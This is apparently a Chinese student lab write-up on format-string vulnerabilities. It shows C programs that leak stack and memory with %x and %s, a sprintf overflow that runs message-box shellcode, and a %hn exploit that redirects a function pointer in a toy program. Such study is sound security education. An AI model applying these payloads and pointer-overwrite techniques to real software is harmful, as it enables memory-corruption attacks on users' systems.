---
title: 格式化字符串
date: 2019-12-25 20:32:14
tags:
  - "网络空间安全"
  - "软件安全"
categories:
  - ["实验","软件安全"]
  - ["漏洞","格式化字符串"]
comments: true
mathjax: true

---

## 目标

通过几个例子来理解格式化输出函数漏洞的利用，使用`%s`、`%x`、`%n`格式操作符操作内存，完成给定shellcode调用。
<!-- more -->

## 测试步骤与结果

### <code>%x</code>查看栈内容

代码如下

```c stackView.c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(){
	__asm int 3
	char format[32];
	strcpy(format,"%08x.%08x.%08x.%08x");
	printf(format,1,2,3);
	return 0;
}
```

* 执行`printf`时，第四个`%x`没有提供相应的参数，会显示该参数所在位置的栈内容。在本例为`00132588h`
  {% asset_img 1.png %}
* 此程序输出如下 {% asset_img 2.png %}

### <code>%s</code>查看指定地址内容

代码如下

```c memoryView.c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(){
	__asm int 3
	char format[40];
	//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址
	strcpy(format,"\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s");
	//输出地址0x77E61044的内存
	printf(format,1,2,3);
	return 0;
}
```

* 代码将要查看位于地址`0x77E61044`的内存内容。
* 前3个参数为提供的3个参数，后面的一群`%x`是为了将`%s`的参数对应到地址`0x77e61044`上，所以可以输出内存`0x77e61044`的内容直到遇到截断符。
    {% grouppicture 2-2 %} {% asset_img 3.png %} {% asset_img 4.png %} {% endgrouppicture %}
    {% asset_img 5.png "内存0x77e61044的内容" %}
* 该段程序输出如下 {% asset_img 6.png %}

### 实际操作对格式化输出函数漏洞进行利用

1. `sprintf()`函数
	* `sprintf`的函数原型是这样的：`int sprintf (char *buffer, const char *format, [argument] ...);`
		- `buffer` 指针指向将要写入字符串的缓冲区
		- `format` 格式化字符串
		- `argument` 为可选参数
	* `sprintf`函数的漏洞点在于它假定任意长度的缓冲区存在。

2. shellcode解析
    {% codeblock lang:c line_number:false %}
    char user[]=
    "%497d\x39\x4a\x42\x00"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
    "\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
    "\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90";
    {% endcodeblock %}
	* 我们使用数组`user`作为用户的“输入”，`\x39\x4a\x42\x00`为shellcode的起始地址，用来覆盖函数的返回地址。`\x33\xdb`开始是我们的弹框shellcode。当调用`sprintf`时，它会读取一个参数以`%497d`的格式写入outbuf，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。需要写入`outbuf`的总字符串长度为 $19+497=516$ ，而`outbuf`长度为`512`，因此会导致栈溢出, 使得函数的返回后执行`sprintf()`后`outbuf`的内容。

3. 漏洞利用
	- 整体代码如下 
        ```c 
        // libraries import omitted 
        void mem(){ 
          //__asm int 3 
          char outbuf[512]; 
          char buffer[512]; 
          sprintf(
	        buffer,
	        "ERR Wrong command: %.400s", user
	      ); /* 执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00" 00424a39为shellcode地址；此处仅仅就是一串nop而已 */ 
          sprintf(outbuf,buffer); 
          //sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00"); 
        }
        int main(){ 
          LoadLibrary("user32.dll"); 
          mem(); 
          return 0; 
        } 
        ```
   
    - `mem`函数中，分配了两个`512`字节大小的缓冲区，并进行了两次`sprintf`操作。
	- 第一次`sprintf`后，`buffer`（在`0x424a30`）中的内容应该是`"ERR Wrong command: %497d\x39\x4a\x42\x00"`，其后的内容因为有`0x00`而被截断。
        {% grouppicture 2-2 %} {% asset_img 7.png %} {% asset_img 8.png %} {% endgrouppicture %}
	- 第二次执行`sprintf`，它会读取一个参数以`%497d`的格式写入`outbuf`，由于未提供该参数，会自动将栈地址`0x0012fae0`中的值视为该参数，即`0x12ff80`。
        {% asset_img 9.png %}
	- `outbuf`起始地址为`0x0012fd2c`, 19字节的字符串`ERR Wrong command: `后为497字节的整型数字`1245056`，因此从`0012ff30`开始为`\x39\x4a\x42\x00`。
	    {% asset_img 11.png %}
	- 我们成功将返回地址`0x4010d1`覆盖为shellcode的地址`0x424a39`。 
        {% grouppicture 2-2 %} 
        {% asset_img 10-ori.png "修改前" %} 
        {% asset_img 10-changed.png "修改后" %} 
        {% endgrouppicture %}
	- shellcode成功执行，弹出对话框。 {% asset_img 12.png %}

## 测试结论

上述溢出程序的修改原理可以用这个图来简单表示。 
{% asset_img IMG_20191225_120713.jpg %}

## 思考题

源代码如下

```c++ foo.cpp
# include <stdio.h>
# include <stdlib.h>
# include <errno.h>

typedef void (*ErrFunc)(unsigned long);

void GhastlyError(unsigned long err)
{
    printf("Unrecoverable error! - err = %d\n", err);
    //This is, in general, a bad practice.
    //Exits buried deep in the X Window libraries once cost
    //me over a week of debugging effort.
    //All application exits should occur in main, ideally in one place.
    exit(-1);
}

void foo(){ 
    printf("I've been hacked!!!"); 
}

void RecoverableError(unsigned long err){ 
    printf("Something went wrong, but you can fix it - err = %d\n", err); 
}

void PrintMessage(char* file, unsigned long err){ 
    ErrFunc fErrFunc; char buf[512];

	if(err == 5)
	{
		//access denied
		fErrFunc = GhastlyError;
	}
	else
	{
		fErrFunc = RecoverableError;
	}

	_snprintf(buf, sizeof(buf)-1, "Can'tFind%s", file);

	//just to show you what is in the buffer
	printf("%s", buf);
	//just in case your compiler changes things on you
	printf("\nAddress of fErrFunc is %p\n", &fErrFunc);

	//Here's where the damage is done!
	//Don't do this in your code.
	//__asm int 3
	fprintf(stdout, buf);

	printf("\nCalling ErrFunc %p\n", fErrFunc);
	fErrFunc(err);

}

int main(int argc, char* argv[]){ 
	//__asm int 3 
	int iTmp = 100; 
	printf("%.300x%hn",11, &iTmp); 
	FILE* pFile;

	//a little cheating to make the example easy
	printf("Address of foo is %p\n", foo);

	//this will only open existing files
	pFile = fopen(argv[1], "r");

	if(pFile == NULL)
	{
		//PrintMessage(argv[1], errno);
		PrintMessage(argv[1], errno);
	}
	else
	{
		printf("Opened %s\n", argv[1]);
		fclose(pFile);
	}
	return 0;
}
```

{% note default %}
`main`函数中根据命令行提供的参数打开对应的文件。如果这个文件不存在，那么就调用`PrintMessage`函数打印相应的错误信息。在`PrintMessage`函数中把错误分为`GhastlyError`和`RecoverableError`两类。要想调用`foo`函数，可以通过`%n`把`fErrFunc`函数的地址修改为`foo`函数的地址。命令行参数为：`%x%x…%x%x%n`+fErrFunc函数指针的地址。`snprintf`之后`buf`为`"Can'tFind%x%x…%x%x%n"`+fErrFunc函数指针的地址，接下来由于`fprintf(stdout, buf)`中缺少了`argument`参数，所以已打出的字符总数通过`%n`被写入fErrFunc函数指针的地址。通过控制`%x`调整已打出的字符总数就能达到我们的目的。 
{% endnote %}

1. 首先传入一串`%x`
   {% codeblock lang:c line_number:false %} 
   argv="%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
   {% endcodeblock %}
2. `fErrFunc`在`0x12ff18`位置上，`foo`在`0x401014`上，`2578`是`%x`的ASCII码。 {% asset_img r1.png %}
3. 加上`%pABC`
   {% codeblock lang:c line_number:false %} 
   argv="%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%pABC"
   {% endcodeblock %} 
   {% asset_img r2.png %}
4. 我们需要把`\x18\xff\x12`放在一个可写的位置上，在前面加上`.`以调整输出内容 {% asset_img r3.png %}
5. 现在把`%p`换为`%hn`，由于多了一个`h`，所以前面要少一个`.`，在后面我们还要放上`\x18\xff\x12`。 {% asset_img r4.png %} 
   {% note info no-icon %} 
   此时<code>0x12ff18</code>的位置已经被更改为<code>0x40017e</code>。 
   {% endnote %}
6. `foo`的地址是`0x00401014`，现在我们写入的值是`0x0040017E`，还差3734个字节。 {% asset_img r5.png %} 
   {% note info %}
   这里是3744不是3734，因为原来第一个`%x`打印了6个字节，为了对齐删掉了4个`.`又少打印了4个字节，所以要把总共少打印的这10个字节加回去。从上图可以看出第一个`%x`对应的内容是`0012FF80`，只打印了`12FF80`；第二个`%x`对应的内容是`00000000`，只打印了`0`；从第三个`%x`开始正常打印8个字节。 
   {% asset_img r6.png "这样构造，即可成功" %} 
   {% endnote %}
7. 利用成功。 {% asset_img rsuccess.png "成功弹框" %}
